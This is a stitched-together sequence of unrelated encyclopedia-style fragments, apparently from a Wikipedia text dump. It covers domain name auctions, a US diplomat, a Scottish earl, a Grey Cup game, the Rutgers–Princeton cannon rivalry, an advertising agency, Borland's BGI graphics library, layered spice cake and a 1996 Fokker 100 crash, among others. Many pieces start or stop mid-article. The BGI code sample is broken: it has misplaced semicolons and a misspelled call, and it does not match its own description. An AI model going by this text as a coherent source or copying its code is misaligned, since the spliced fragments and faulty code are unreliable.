a greater number of potential buyers. Sites such as eBay and Sedo have made using auctions very commonplace, and domain auction sites also require little to no technical knowledge to use. In the past, if a domain name was already registered by another party, it was generally advisable to choose a different name. Whether current owners list domains for auction for a specified period of time or provide an instant purchase option, the domain auction has become an important tool in uniting buyers and sellers in the quest for the most beneficial domain name. Cybersquatting There are occasions when domain auctioning results from a practice known as \\"cybersquatting.\\" According to the U.S. federal law known as the Anti-Cybersquatting Consumer Protection Act, cybersquatting is registering, trafficking in, or using a domain name with bad-faith intent to profit from the goodwill of a trademark belonging to someone else. Many predatory buyers will even employ software to search for newly expired domains and register them out from under the original owner before s/he can renew it. This practice is often used to extort large amounts of money from legitimate domain name holders who rely on their domain names to remain in business. Evolution of Domain Names Basic uses and purposes of Domain Names In order for the exchange of information to be organized and searchable on the World Wide Web domain names are used. Domain names are substitutes for IP addresses, which are presented numerically, in order to further simplify the process of searching for information on the Internet. Domain name servers maintain the list that matches domain names to IP addresses. There are two types of domain names TLDs or Top Level Domains which include: .com, .edu, .gov, .net, .org, etc., and SLDs or secondary level domains, which precedes TLDs in the web address, and usually refers to the organization that has been registered to TLD by ICANN. Domain Names become Lucrative Domain names started to become a lucrative good when businesses began advertising themselves on websites other than the ones that they operated. These businesses paid fees to place their ads on other websites, and the ads were initially displayed on banners with links to the advertisers webpage embedded within them. The number of ‚Äòclick throughs‚Äô for an ad on a particular webpage determined the rates a website could charge an advertiser. Monetizing web- spaces and links such as this soon gave way to auctioning off domain names. Auctioning Domain Names The final step that led to auctioning off domain names was Google‚Äôs Pay per click (PPC) auction model which allowed bidders to buy search terms. This allowed webpage owners to sponsor a keyword so that their ad could appear each time a user searched the term on Google, and thus increased the likelihood of the ‚Äòclickthroughs‚Äô their sponsor ad obtained. Gradually, as advertisement placement and sponsoring or trademarking search terms on the World Wide Web became a viable source of profit, so did domain names that attracted attention from Internet users and advertisers. Additionally, new business models for monetizing domain names are emerging. In addition to the Pay per click (PPC) model, the Cost per action (CPA) or pay- per-action model is being used as a new strategy for online advertising.http://domainnamewire.com/2009/08/07/revisiting-the-cpa-business- model/ Recent Developments The US government has officially renounced its control over the Internet‚Äôs technical operations, including domain name systems, as of March 15, 2014. Responsibility has been handed over to the global multi-stakeholder community in hopes that the community transitions away from any US government oversight of the domain name system. The transition away from US government control over Internet domain names officially began in 1997 when oversight of the system‚Äôs technical operations were assigned to a nonprofit group, the Internet Corporation for Assigned Names and Numbers (ICANN), however, until now, the US government has remained a prominent force in regulating and monitoring these auctions. According to the Senate Commerce Committee chairman, John Rockefeller, their recent decision to hand over all control to private entities is an effort to continue ‚Äútransitioning movement of the Internet‚Äôs domain name system to an independent entity that reflects the broad diversity of the global internet community. It is consistent with other efforts the US and allied countries have instituted to promote open Internet to preserve and advance the current multi-stakeholder model of internet governance.\\"  References  Category:Domain Name System Category:Contexts for auctions ","title":"Domain name auction"},{"id":"8101421","text":"Can You Hear Us? is the debut studio album and third album overall by David Crowder Band and the first recorded for sixstepsrecords, released in February 2002.

The Castle is situated to the east. Climate Pinnacle Peak is located in the marine west coast climate zone of western North America. Most weather fronts originate in the Pacific Ocean, and travel northeast toward the Cascade Mountains. As fronts approach, they are forced upward by the peaks of the Cascade Range (orographic lift), causing them to drop their moisture in the form of rain or snowfall onto the Cascades. As a result, the west side of the Cascades experiences high precipitation, especially during the winter months in the form of snowfall. During winter months, weather is usually cloudy, but, due to high pressure systems over the Pacific Ocean that intensify during summer months, there is often little or no cloud cover during the summer. Because of maritime influence, snow tends to be wet and heavy.

Spain James William Spain (July 22, 1926 - January 2, 2008) was in the US Foreign Service with postings in Karachi, Islamabad, Istanbul, Ankara, Dar Es Salaam, and Colombo and four ambassadorships in Tanzania, Turkey, the United Nations (as deputy permanent representative), and Sri Lanka. His son is Patrick Spain, founder of Hoover's and HighBeam Research. Biography Ambassador Spain was born in 1926 in Chicago, Illinois, where he attended St Brendan's Parochial School and Archbishop Quigley Preparatory Seminary where his classmates included priest/author Andrew Greeley and \\"Vatican Banker\\" Paul Marcinkus. He received a master's degree from the University of Chicago and a PhD from Columbia University. Ambassador Spain served in World War II, for a time serving on General Douglas MacArthur's staff as a photographer in occupied Japan. He entered the Foreign Service in 1951, and spent the entirety of his career in government service. His assignments took him to Pakistan, Turkey, Tanzania, the UN, and Sri Lanka. His first post was as Vice Consul in Karachi in 1951. Following that he returned the U.S. where he lived, mostly in Washington, DC, until 1969. He was appointed as Charg√© d'Affaires to Pakistan in 1969, Consul General in Istanbul from 1970‚Äì1972, Deputy Chief of Mission in Ankara (1972‚Äì1974), Ambassador to Tanzania (1975‚Äì1979) and Deputy Ambassador to the United Nations under Andrew Young briefly in 1979, Ambassador to Turkey from 1980‚Äì1981, and finally as Ambassador to Sri Lanka from 1985 - 1988. He retired a Career Minister in the Foreign Service and remained in Sri Lanka until 2006, when he returned to the United States, settling in Wilmington, NC. He was the author of numerous books, including In Those Days, American Diplomacy in Turkey, The Way of the Pathans, Pathans of the Latter Day, and a series of novels featuring Dodo Dillon. He contributed articles on foreign affairs to a variety of publications. Ambassador Spain lived a distinguished life of service to his country and dedication to his friends and family. He was a remarkably able diplomat who drew on his own odyssey from an impoverished youth on the South Side of Chicago ‚Äì the son of a streetcar conductor and a seamstress who were Irish immigrants ‚Äì to attending receptions with Presidents and Prime Ministers to inspire those around him to seek the best for themselves and their country. He met adversity with strength, rudeness with grace, and challenges with enthusiasm. He played pivotal roles in maintaining and strengthening the United States alliance with Turkey, in bringing about a peaceful transition to majority rule in Zimbabwe, and strengthening the United States' relations with all the countries of the subcontinent. He was most proud not of the headlines that he had a part in, but of the headlines that never had to be written, thanks to his work defusing tensions between nations. One of his earliest memories of Chicago was being taken by his father to watch Al Capone walk through City Hall. His glimpse of the legendary gangster impressed many, among them Jawaharlal Nehru, the first prime minister of India, who once held up a reception line just to hear about it. James W. Spain, 81, died on January 2, 2008, of natural causes in Wilmington, North Carolina. He was preceded in death by his wife Edith and daughter Sikandra. He is survived by his sons, Patrick Spain, Stephen, William (since deceased) and his grandchildren, Jeanne, James, Aidan, Katherine, and Rachel. Publications He authored a number of books. In Those Days: A Diplomat Remembers is his autobiography, a memoir of his time as an American diplomat who spent most of his life in Asia and Africa, engaged in high-level diplomacy. He is also the author of The Pathan Borderland; People of the Khyber; Pathans of the Latter Day; Diplomacy in Turkey and The way of the Pathans. Other activities * In retirement, James W.

He was the eldest son of John Bowes, 9th Earl of Strathmore and Kinghorne and Mary Bowes, Countess of Strathmore and Kinghorne. His mother was the author of the verse drama, \\"The Siege of Jerusalem\\" (1769). He succeeded his father as Earl of Strathmore and Kinghorne when the latter died at sea on 7 March 1776. From 30 June 1796 to 24 October 1806 and again from 9 June 1807 to 29 September 1812, he sat as a Scottish Representative peer in the House of Lords. He had a long affair with the commoner Mary Milner, the beautiful daughter of a gardener; according to some versions (notably offered by Augustus Hare) he went through a false ceremony of marriage with her. They had one son: *John Bowes (1811‚Äì1885), known as Lord Glamis from birth until 1820, and sent to Eton under that name. The Earl was created Baron Bowes in 1815 and held this as a subsidiary title to his death. He married Mary on 2 July 1820, a mere day before his death. He attempted to legitimize his son by this marriage and his will named his son as his heir. According to his will (dated 3 July 1817), all his real estate were left to Mary and five other trustees in name of his son. The trustees were also required to pay Mary ¬£l,000 p.a for life. But this deathbed marriage did not prevent his primary title from being inherited by his younger brother Thomas Lyon-Bowes, 11th Earl of Strathmore and Kinghorne. The Scottish courts agreed that by marrying Mary, John had been legitimized under Scottish law, but since both parties (notably the father) were domiciled in England, English law would prevail. And Scottish law required Scottish domicile of the parents for the son to have been legitimated. It was on the point of domicile that John's legitimation failed. A bitter court case followed over the terms of the Earl's will, and after five years, it was decided that the Earl's son John would inherit his English estates, including Gibside, Streatlam Castle and St Paul's Walden Bury, while his brother would inherit the Scottish estates. His secondary title as Baron Bowes became extinct. Mary, now Dowager Countess of Strathmore, married in 1831 her son's tutor William Hutt, and died in 1860. Her son John Bowes married twice, but had no issue. He is best known today as the founder of the Bowes Museum. On his death, all his wealth and properties were inherited by the family of his uncle, reuniting the Scottish and English estates of the Bowes-Lyon family.

The Ottawa Rough Riders defeated the Edmonton Eskimos before a crowd of 36,653. Game summary Edmonton scored quickly in the first quarter when running back Roy Bell found a big hole in the left side for a 38-yard touchdown run. Rick Cassata, the Riders' backup quarterback who was replacing injured Jerry Keeling responded with a 38-yard touchdown pass-and-run to Rhome Nixon. Late in the quarter, however, Tom Wilkinson was knocked out of bounds by Ottawa's Wayne Smith and suffered a rib injury. He was replaced by backup Bruce Lemmerman. Lemmerman took the Eskimos close enough for Dave Cutler to kick a field goal, giving them a 10-7 lead at the end of the first quarter. A low snap to Edmonton punter Garry Lefebvre caused him to bobble the ball in the end zone, and he was tackled for a safety by Ottawa's Wayne Tosh at 21 seconds of the second quarter. Gerry Organ kicked a 46-yard field goal in the last minute of the half. The half-time score was 12-10 for Ottawa. Ottawa increased its lead with an 18-yard touchdown run by Jim Evenson at 9:45 of the third quarter. In the fourth quarter, Lemmerman suffered an arm injury, and Wilkinson, his rib injury frozen, came off the bench to bring some life to the Eskimo offence. Edmonton receiver Tyrone Walls fumbled after receiving a Wilkinson pass on Edmonton's 47. Wayne Tosh recovered and Organ kicked another Ottawa field goal from the 39. Edmonton then scored a single and Lefebvre, who played both ways as well as being the punter, caught a Wilkinson touchdown pass with seven seconds left, but it was not enough to erase Ottawa's 12 point lead. Most Valuable Players Ottawa Defensive End Charlie Brandon was named Most Valuable Player and Garry Lefebvre was named Most Valuable Canadian. Trivia This would be the first a string of nine Grey Cup appearances for the Edmonton Eskimos from 1973 to 1982. The only year they missed the Grey Cup during that span was 1976, when the Saskatchewan Roughriders defeated them in the West Final. Edmonton was victorious in six of their nine appearances (1975, and five straight from 1978‚Äì82). This was the last Grey Cup game played at CNE Stadium prior to its renovations in the mid-1970s in anticipation of receiving a Major League Baseball team in Toronto; it would come in the form of the Blue Jays in 1977. By the next Grey Cup game played at the stadium in 1976, the renovation and expansion had been completed.

Built to host the 2000 FIFA Futsal World Championship, it is located in the Zone 13 of the Guatemalan capital, in the location of the Guatemalan bullring, and has a capacity of 7,500 seats. The venue is owned and operated by the Confederaci√≥n Deportiva Aut√≥noma de Guatemala (CDAG), and is also used for musical presentations, as well as cultural and political activities, for which the CDAG leases the site. According to the CDAG, the Dome is a beautiful venue, but the high cost of its operation has affected its role as a sports venue, because most sports federations in the country cannot afford the cost of using it. By 2003, 60 percent of the activities conducted at the Domo were not related to sports. Events During the 2000 Futsal World Championship, the Domo hosted 28 of the 40 matches, including all of the second stage and the final stage. Attendance at the Domo averaged 6,728 spectators (89.7%) per match for the tournament, with the highest attendance occurring on the last day of competition, Sunday, December 3, for the Third place and Final matches, when a crowd of 7,568 was registered. On March 10, 2007, the facility hosted the WWE Raw, a professional wrestling event and World Wrestling Entertainment's most popular show.

History Rutgers and Princeton are both located in Central New Jersey, about 17 miles from each other. Princeton was founded in Elizabeth, New Jersey in 1746 and then relocated to Princeton 10 years later; Rutgers was founded in New Brunswick in 1766. In 1864, Rutgers educators George Cook and David Murray led a successful campaign to designate Rutgers as New Jersey's designated land-grant university, overcoming competition from other colleges in the state, notably Princeton. On November 6, 1869, Rutgers defeated Princeton in New Brunswick at the first intercollegiate football game on a field where Rutgers' College Ave Gymnasium now stands, adding to the rivalry between the two schools. Two Revolutionary War cannons were left on the Princeton campus at the end of the war, although neither of them were used in the Battle of Princeton, as is often claimed. \\"Big Cannon\\" is located behind Nassau Hall in the center of the quadrangle there, called \\"Cannon Green\\",Smagorinsky, Margaret. \\"Some Legends and Lore of Princeton University\\" Princeton University, 1993. and \\"Little Cannon\\" is situated between Whig and Clio Halls.Leitch, Alexander. A Princeton Companion. Princeton, New Jersey: Princeton University Press, 1978 For the War of 1812, \\"Big Cannon\\" was transported to New Brunswick to help defend the city against potential attack by the British, remaining on the Rutgers campus - where it was used for training during and after the Civil War by Rutgers cadetsStamato, Linda. \\"Rutgers and Princeton: Tradition, rivalry and the cannon wars\\" NJ.com (September 11, 2012) - until it was taken back to Princeton in 1836 by the \\"Princeton Blues\\", a local militia. Unfortunately, the wagon it was being transported in broke down on the outskirts of Princeton, and the cannon did not reach the Princeton campus until 1838 when Leonard Jerome - who would become the maternal grandfather of Winston Churchill - led a large group of students who brought it to Nassau Hall. The cannon was then \\"planted\\", muzzle down, in its current location, in 1840. On the night of April 25, 1875 ten members of the Rutgers Class of 1877 set out to steal back \\"Big Cannon\\" from Princeton However, they were unable to move it, so instead they returned to New Brunswick with \\"Little Cannon\\". Princeton responded with a raid on Rutgers, stealing some muskets, and the heads of the two colleges exchanged polite but demanding correspondence. Eventually, a joint committee settled the matter, and \\"Little Cannon\\" was returned to Princeton, escorted by the New Brunswick Police Chief. A few Rutgers students spiritedly painting the cannon on the Princeton University campus In October 1946, a contingent of Rutgers men slipped onto the Princeton campus and again tried to steal the famed cannon. This attempt was even more disastrous than the first. They attached one end of a heavy chain to the cannon and the other to their Ford automobile. Surprised by Princeton students and the police, they gunned the engine of the car so hard that the car was torn in half. The Rutgers students managed to escape, but with neither the car nor the cannon. On the eve of the annual Rutgers-Princeton game in the fall of 1971 the cannon was apparently \\"stolen\\", again. A 4'x5' hole some 5 feet deep was found where the cannon sat. Campus police were baffled that the cannon had been taken given its extreme weight. After crime photos were taken, it appears that a hole had simply been dug next to cannon and the dirt from the hole used to bury it. Reports appeared in both the Rutgers Targum as well as the New Jersey and Princeton papers. The cannon at Princeton is routinely painted red by Rutgers students, particularly in the week leading to Rutgers commencement as well as on other notable Rutgers dates. In February 2010, The war between loyal Rutgers and Princeton students became more than just \\"the painting of a cannon\\". In the depths of of snow, students not only painted the cannon and its surrounding concrete, but used spray paint to \\"tag\\" Princeton classroom buildings, dormitories, and libraries. Many Rutgers bumper stickers reading \\"Rutgers, Jersey Roots Global Reach\\" were placed all over campus. In November 2011, a group of Rutgers students who went to paint the cannon in Princeton brought a video camera with them and made a documentary about the tradition. The footage became part of a larger project about the history of the Cannon War and its perception in the minds of current students today. The film, \\"Knights, Tigers, and Cannons. Oh My!\\", by Zack Morrison, premiered at the New Jersey Film Festival in September 2012, and won the award for Best Student Film.

It was founded in Chicago in 1923, and was acquired and merged into the Saatchi & Saatchi network in the 1980s. History The agency was founded in 1923 by Hill Blackett and John Glen Sample, in Chicago. E. Frank Hummert joined the agency in 1927, and it was renamed Blackett-Sample-Hummert, even though Hummert was never a partner in the company. Blackett left company management, despite remaining a partner, when he was commissioned into the U.S. Navy in 1942. Hummert left the company at the end of 1943, forming Hummert Radio Productions with his wife Anne. Sample, after unsuccessful attempts to buy out the absent Blackett, announced that they would allow the firm to dissolve when their partnership agreement expired in 1944, and that he would enter a new partnership with B-S-H president H.M. \\"Mix\\" Dancer at that time. These plans were later altered to terminate the partnership earlier, on January 1, 1944, with Blackett forming his own firm and Dancer and Sample adding as a partner Clifford L. Fitzgerald, then a B-S-H vice president and director. DFS purchased Val-Mar Studios, a Mexican animation studio in 1959, and became Gamma Productions. It used the studio to produce television cartoons for Jay Ward Productions and Total Television; the studio closed in 1968. Its productions remain in reruns, distributed through The Program Exchange. DFS founded Program Syndication Services in 1973 and The Program Exchange in 1979. On February 24, 1986, Saatchi & Saatchi agreed to acquire Dancer Fitzgerald Sample for $75 million, and immediately announced that it would be merged with Saatchi's UK network Dorland Advertising. At that time, Dancer Fitzgerald Sample was the thirteenth largest advertising agency in the US, with billings of $876 million and clients including Procter & Gamble, General Mills, Toyota, Sara Lee and RJR Nabisco. The new DFS Dorland Worldwide network was to be operated independently from the Saatchi & Saatchi Compton Worldwide network and was at that time the sixteenth largest agency network in the world.Goldman - Conflicting Accounts By June 1987, however, DFS was merged with Saatchi & Saatchi Compton, the US subsidiary of Saatchi & Saatchi.answers.com At that point the merged business became the largest agency in New York with billings of $2.3 billion. The consolidation ended DFS's relationship with Dorland, which at that point was the third-largest London agency. Legacy In 1980, DFS created McGruff the Crime Dog. A famous line to come out of DFS in the 1980s was the pop-culture hit \\"Where's the beef?\\" created for Wendy's by DFS creative director Cliff Freeman.

BGI was also used to provide graphics for many other Borland products including the Quattro spreadsheet. The library loaded graphic drivers (\`*.BGI\`) and vector fonts (\`*.CHR\`) from disk in order to provide device independent graphics support. It was possible for the programmer to embed the graphic driver into the executable file by linking the graphic driver as object code with the aid of a utility provided by the compiler (\`bgiobj.exe\`). There were graphic drivers for common graphic adapters and printers of that time, such as CGA, EGA and VGA. There also were BGI drivers for some kinds of plotters. The last Borland's C++ IDE for DOS is Borland C++ 3.1 (1992). The last C++ environment which supports BGI is Borland C++ 5.02 (1997), which works under Windows but can compile DOS programs. BGI was accessible in C/C++ with \`graphics.lib\` / \`graphics.h\`, and in Pascal via the \`graph\` unit. BGI is less powerful than modern graphics libraries such as SDL or OpenGL, since it was designed for presentation graphics instead of event-based 3D applications. However, it has been considered simpler to code. Third-party BGI drivers Given the popularity of Borland compilers, a few independent software developers produced BGI drivers for non-standard video modes, advanced video cards, plotters, printers, and graphics file output. In 1994 Jordan Hargraphix Software released SVGA BGI drivers version 5.5 that are compatible with some SVGA hardware like ATI or Cirrus Logic cards and VESA VBE-compatible cards. Also there are tweaked VGA drivers for non-standard graphic modes supported by VGA by writing directly into its registers, protected mode driver versions for Turbo Pascal 7.0 and mouse driver (actually cursor handler for unsupported video modes by standard mouse drivers). These drivers were shareware and buying them let receiving their source code and technical support; now they are no longer supported and come as abandonware. Main bugs are lack of aligning bytes support in VESA true-color modes (so the true-color driver is not suitable for Nvidia graphic cards) and video memory bank switching bug in mouse driver (since real mode addressing space is 1 megabyte, but some video modes require up to 4 megabytes of memory, it is split into 64 kilobyte banks). Example The following program, written for Borland Turbo C, initialises the graphics and draws 1000 random lines: #include #include #include void draw (int x, int y, int x1, int y1); { putpixel(x+x1 ,y+y1 ,11); putpixel(x-x1 ,y+y1 ,11); putpixel(x+x1 ,y-y1 ,11); putpixel(x-x1 ,y-y1 ,11); putpixel(x+x1 ,y+y1 ,5); putpixel(x-x1 ,y+y1 ,5); putpixel(x+x1 ,y-y1 ,5); putpixel(x-x1 ,y-y1 ,5); } void Brescircle (int x, int y, int r); { int x1=0, y1=r; int d=3-2*r; draw(x, y, x1, y1); while (y>=x) { x++; if(d>0) { y--; d=d+4*(x1-y1)+10; } else d=d+4*x1+6; draw (x, y, x1, y1); delay(500); } } int main() { int x, y,r; int gd=DETECT, gm; intigraph(&gd;, &gm;,\\"\\"); printf(\\"ENTER THE VALUE OF X CO-ORDINATE: \\"); scanf(\\"%d\\", &x;); printf(\\"ENTER THE VALUE OF y CO-ORDINATE: \\"); scanf(\\"%d\\", &y;); printf(\\"ENTER THE VALUE OF RADIUS: \\"); scanf(\\"%d\\", &r;); Brescircle(x, y, r); getch(); return 0; } See also * Allegro * Graphics System Extension (GSX) * Graphical Kernel System (GKS) * Raylib * SciTech SNAP * UniVBE References * Turbo C++ 3.0 User's Guide.

In this method, sperm that will give rise to male versus female children are separated by moving at different speeds through a protein solution. When used to increase the likelihood of a female child, studies have resulted in between 70% and 80% female children. When used to increase the likelihood of a male child, studies have resulted in between 50% to 75% male children. Method The Ericsson method is based on the belief that X-sperm swim slower than Y-sperm. Sperm are placed atop a \\"column\\" of increasingly thicker layers of albumin, and allowed to swim down into the solution. After a certain time period has elapsed, the sperm can be separated into the faster and slower swimmers. If the couple desires a male baby the faster swimmers are artificially inseminated, and if the couple desires a female baby the same procedure is enacted with the slower swimmers. This method differs from the Shettles method, which does not utilize artificial insemination. History It was developed and patented by Dr. Ronald Ericsson. The method has been in use since the mid-1970s.  References  Further reading The below references were taken from 123 published papers.

His progress was restricted by a number of serious injuries, including an injury to his right knee in 2001. He was sent to the world-renowned Dr Richard Steadman in Colorado, America who specialises in knee surgery.David Mannix: 'I block out a lot of the memories' independent.co.uk Under-18 Academy manager John Owens said: \\"At Under-15/Under-16 level David was such a shining light in central midfield. He is a very strong but gifted midfield player.

After this incident, Mannix managed to fight his way back into the first team and played in every game for Chester from the end of January. Mannix managed to score his first professional league goal on 28 February 2009 against Dagenham and Redbridge for Chester with a header into the top right corner. Mannix's second league goal for Chester came in their 2‚Äì1 victory against Notts County on 4 April. Following on from the end of his ban for betting he went on trial with League 2 club Morecambe and German 3rd division team Unterhaching. In October 2010 he joined Vauxhall Motors. Mannix made an important start to his career at Vauxhall Motors by scoring the only goal of the game in their 1‚Äì0 victory against Newcastle Town to help the side reach the FA Cup first round. After a spell with Colwyn Bay, Mannix signed for Warrington Town in January 2013. In June 2015 Mannix signed for Welsh Premier League club Rhyl.

Anic√©e Shahmanesh or Anicee Schahmane () (28 January 1953, Boulogne-Billancourt, Hauts-de-Seine ‚Äì d. 11 November 2006, Boncourt, Eure-et-Loir from cancer) was a French singer and actress.Anic√©e (ALVINA) Shahmanesh: France's Sex Icon of the 1970s - Darius Kadivar - 27 February 2006 - Payvand Iran News Early life and career Alvina's French mother and Iranian father owned a house on Rue de Verdun in Le V√©sinet in which commune Alvina attended the Lyc√©e Alain. After her 1969 graduation from the Conservatory in Saint-Germain-en-Laye Alvina made her screen debut in Elle boit pas, elle fume pas, elle drague pas, mais... elle cause ! (fr) in 1970. Her second screen appearance was in the 1971 Lewis Gilbert film Friends, which would stay as her sole claim to international fame. The movie featured songs composed by Elton John and Bernie Taupin, and a subsequent best-selling OST album by the former. The film included a scene of the seventeen-year-old Alvina's distantly-shot frontal nudity, albeit the actress was playing a fourteen-year-old character. She also starred in the 1974 sequel of Friends, entitled Paul and Michelle, although this followup movie was not as successful. Alvina appeared regularly on the French screen, both cinema and television, throughout the 1970s chiefly in nymphet roles, working with such directors as G√©rard Blain, Jacques Doniol-Valcroze, and Alain Robbe-Grillet, Alvina's highest career profile probably being afforded by the Robbe-Grillet films Glissements progressifs du plaisir (1974) and Le Jeu avec le feu (fr) (1975). Later career and death Alvina starred in the TF1 mini-series Les 400 coups de Virginie (fr), which ran for six episodes from December 1979 to February 1980. Her only cinematic film credit for the 1980s was the 1981 film R√™ve apr√®s r√™ve, a film directed and written by fashion designer Kenzo Takada, although Alvina did play the title role in the 1983 made-for-television film version of Diane Lanster (fr) directed by Bernard Queysanne (fr). Also in the early 1980s, Alvina attempted a singing career, with a solo single released in 1982. Then she joined the group Ici Paris, who had several singles released in 1980‚Äì83 and also a 1982 album, to replace Marie Alcaraz as lead singer and frontwoman. Around the time of her 1984 marriage, Alvina evidently retired from the entertainment world and did not re-emerge till 1995, when she resumed her acting career with the first of a series of occasional screen appearances. Alvina died of lung cancer on 11 November 2006, at the age of 53 years.  Partial filmography  * Elle boit pas, elle fume pas, elle drague pas, mais... elle cause !

It was developed during colonial times in the Dutch East Indies. The firm-textured cake is an Indo (Dutch-Indonesian) version of the European multi-layered spit cake. However it is not baked on a rotating spit, and contains a mix of Indonesian spices, such as cardamom, cinnamon, clove, mace and anise. The cake is made of flour and yolk and is rich in butter or margarine. Spekkoek is popular in Indonesia and is served as a holiday treat, especially for natal, imlek, and lebaran. It is also served or given as gifts during many local festivities such as at birthday parties and weddings. In the Netherlands, the sliced cake is traditionally served for dessert in rijsttafel. Etymology The Dutch term spekkoek translates literally as pork belly (or bacon) cake, a name derived from its appearance of dark and light layers. Its Indonesian name, lapis legit, means sweet layer cake. The English translation is often given as thousand layer cake, or thousand layer spice cake. Origin Spekkoek is thought to have been made by the wives of Dutch administrators in Batavia (modern-day Jakarta) during the colonial period and served during evening tea. Preparation As a spekkoek commonly has more than 18 layers, baking it requires patience and is a very labour-intensive process. The batter is mainly made of butter, flour and sugar with an approximate ratio of 1:1:2. Each layer is made by pouring a small amount of batter into a baking tin, which is then put into an oven and grilled from above until the layer has turned golden from the heat. The tin is then removed from the oven and the process repeated to build up the remaining layers. Dutch ovens with a charcoal fire on top of the lid are said to produce the best results, while electric ovens are superior to gas ovens as cakes bake much faster in the former. Where clove buds or cardamom seeds are difficult to find, bakers can use spekkoek powder as a replacement. Milling and mixing the spices right before baking produces a cake with an excellent aroma. The ground spices must be sieved into the flour at least three times as the spice powder is very fine and tends to clump in the batter. In Indonesia, there are many varieties of lapis legit, including cakes containing almonds, cashew nuts, cheese, prunes or raisins, and even cakes flavoured with chocolate and pandan.

Generally, a typical lapis legit cake is sold in a square pan (approx 20x20x6) and costs at least Rp 350,000 for a home-made, and up to Rp 900,000 for a special made (commercialised). Similar cakes Kue lapis SurabayaIn Malang, East Java, kue lapis malang or spiku malang refers to a two-layered cake, prepared using a different technique. Two batter mixes are prepared, one with naturally produced yellow colour, the other mixed with cocoa powder to produce a dark brown colour. The batter mixes are poured into two different baking tin and baked in the oven. To assemble, the cake is layered on top of the other with a thin layer of fruit jam in between. Similarly in Surabaya, kue lapis surabaya or spiku surabaya refers to a three- layered cake, prepared using a similar technique to spiku malang. Lapis legit is similar to traditional Indonesian kue lapis, the difference being that lapis legit is a puffy layered cake, made of flour and is baked, while kue lapis is a moist layered pudding, made of rice flour and sago, and is steamed. Lapis legit has also spread to Malaysia. A form developed in Sarawak is called the Sarawak layer cake or kek lapis Sarawak which has greater colour and flavour variations.

On 31 October 1996, at 8:27 (UTC-2), the starboard engine of the Fokker 100 operating the route reversed thrust while the aircraft was climbing away from the runway at Congonhas. The aircraft stalled and rolled beyond control to the right, then struck two buildings and crashed into several houses in a heavily populated area only 25 seconds after takeoff. All 95 people on board were killed, as well as another 4 on the ground. It is the fourth deadliest accident in Brazilian aviation history, the second at the time. It is also the deadliest aviation accident involving a Fokker 100. Aircraft The aircraft involved was a Fokker 100 with the registration PT-MRK. The aircraft made its first flight on 8 February 1993 and was acquired second-hand by TAM Transportes A√©reos Regionais in April 1995; it had accumulated more than 8,000 flying hours. It wore a special promotional blue livery on its fuselage with the inscription \\"Number 1\\", in reference to TAM being awarded \\"Regional Airline of the Year\\" by Air Transport World magazine.  Crew  The Captain was 35-year-old Jos√© Antonio Moreno, who had more than 9,000 hours of flight experience, including 3,000 hours on the Fokker 100. The first officer was 27-year-old Ricardo Luis Gomes, who had 4,000 flight hours, with 160 of them on the Fokker 100. There were also five flight attendants on board. Accident The landing gear of the aircraft, having crashed into a house The Fokker 100 aircraft incorporates a safety system to deal with an accidental deployment of a thrust reverser on take-off or when in flight; the system automatically moves the thrust control of the affected Rolls-Royce Tay 650-15 engine to reduce power, the aeroplane then being capable of climbing out safely on the full power of the one unaffected engine, or of maintaining normal flight at reduced power. In addition, a micro-switch, activated by the aircraft's main landing gear leaving the ground, disables the thrust reverser operating circuitry, preventing inadvertent operation of the thrust reverser in flight. Rolls-Royce Tay 650-15 on a Fokker 100 of a type similar to the accident aircraft, with thrust reverser actuated. As the aircraft lifted off the runway on the accident flight with both engines at full power, a faulty switch in conjunction with a possible short circuit caused the right engine's thrust reverser to deploy. The imbalance of power resulted in the aircraft rolling and veering to the right as it was climbing away from the runway. The safety system automatically cut the power to the engine suffering the thrust reverser malfunction. There was no alarm or other indication in the cockpit to indicate that a thrust reverser had been accidentally deployed. The crew had no way of knowing what the true problem was. The copilot, seeing the right engine power lever automatically move to the closed position, thought that the lever had slipped back due to a problem with the autothrottle system and pushed it back to the full power position alongside the left engine throttle lever. Once again, the automatic safety system closed the right engine throttle and the captain, who was conducting the takeoff, called for the autothrottle system to be switched off. After switching off the system, the copilot again pushed the right engine power lever fully forward and forcefully held it there. The safety system cable, responsible for pulling the power lever to the idle position, was no longer able to withstand the physical strain of being pulled one way by the actuator, while the copilot forced it the other way by pushing the throttle lever to the fully open position -- the cable soon parted at a maintenance connection. With the lever no longer restrained by the safety system, the copilot continued to hold the right throttle fully open. The combination of the right engine at full thrust in reverse and the left engine still at normal forward take-off thrust caused the aircraft to roll violently to the right and descend into the ground.  Investigation  In the subsequent investigation it was discovered that the flight crew had not been trained for such an occurrence as the aircraft's manufacturer, Fokker, had judged the failure mode to be so remote a possibility that training for recovery was not necessary.  Dramatization  The crash was featured in the 15th season of the television documentary series Mayday in an episode titled \\"Carnage in S√£o Paulo\\".

Griffith's botanical publications are from India and Burma. After a brief stay in Madras, he was assigned as a Civil Surgeon to Tenasserim, Burma, where he studied local plants and made collecting trips to the Barak River valley in Assam. He explored various parts of Burma, traveling the rivers, including the Irrawadi as far as Rangoon. He visited the highlands of Sikkim, and the region of the Himalayas around Shimla. Subsequently, Griffith was appointed as Civil Surgeon in Malacca, where he died of a parasitic liver disease. Biography Memorial inscription at Madras William was born at Ham in March 1810. He studied under a private tutor along with brothers and even in his early days, took an interest in botany. He later went to London University where he studied under Robert Brown and Lindley. He received the Linnaean Gold Medal of the Society of Apothecaries in 1830 (botanical class) and joined the East India Company as an assistant surgeon at Madras on 24 September 1832. In 1835 he was deputed to join Nathaniel Wallich and John McClelland on a mission to examine tea cultivation in northeastern India. The Commissioner in Assam, Jenkins, later deputed him to visit the Mishmi Hills and the Lohit valley. He served with Major Robert Boileau Pemberton's mission to Bhutan in 1837. In 1839 he visited the Indus region and studied the botany of Afghanistan, returning to 1841 and recuperating in Shimla before visiting his brother at Jabalpur.

